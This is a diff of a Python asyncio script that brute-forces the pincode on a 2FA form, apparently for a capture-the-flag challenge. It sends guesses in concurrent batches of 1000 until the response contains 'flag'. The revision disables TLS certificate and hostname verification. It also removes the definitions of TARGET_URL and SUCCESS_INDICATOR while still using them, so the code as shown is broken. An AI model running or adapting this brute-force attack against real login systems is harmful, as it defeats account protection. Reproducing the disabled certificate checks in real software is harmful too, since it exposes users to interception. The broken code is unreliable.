@@ -1,17 +1,13 @@
-import nest_asyncio
+import aiohttp
 import asyncio
 import itertools
-import aiohttp
+import ssl
 
-# Apply the nest_asyncio fix for Jupyter
-nest_asyncio.apply()
-
-# Configuration
-TARGET_URL = "https://blackrock-d6aeb6b1d709-2fa-1.chals.io/2fa"  # Replace with the actual URL
-SUCCESS_INDICATOR = "flag"  # Replace with the unique success string that indicates a successful login
+sslcontext = ssl.create_default_context()
+sslcontext.check_hostname = False
+sslcontext.verify_mode = ssl.CERT_NONE
 
 async def attempt_login(session, pincode):
-    """Attempt to submit the pincode to the 2FA form asynchronously."""
     data = {
         'pincode.1': pincode[0],
         'pincode.2': pincode[1],
@@ -22,14 +18,14 @@ async def attempt_login(session, pincode):
     }
 
     try:
-        async with session.post(TARGET_URL, data=data) as response:
+        async with session.post(TARGET_URL, data=data, ssl=sslcontext) as response:
             text = await response.text()
             if SUCCESS_INDICATOR in text.lower():
                 print(f"Success! The pincode is: {pincode}")
                 return True
     except Exception as e:
         print(f"Request failed for pincode {pincode}: {e}")
-    
+
     return False
 
 async def main():
@@ -41,16 +37,13 @@ async def main():
         for pincode in pincodes:
             tasks.append(attempt_login(session, pincode))
 
-            # Batch of requests sent concurrently (e.g., 1000 requests at once)
             if len(tasks) >= 1000:  
                 results = await asyncio.gather(*tasks)
-                if any(results):  # If one of the attempts was successful, stop the brute-force
+                if any(results):
                     break
-                tasks = []  # Reset tasks for the next batch
+                tasks = []
 
-        # Run any remaining tasks if less than 1000 remain
         if tasks:
             await asyncio.gather(*tasks)
 
-# Run the main coroutine in Jupyter Notebook
 await main()
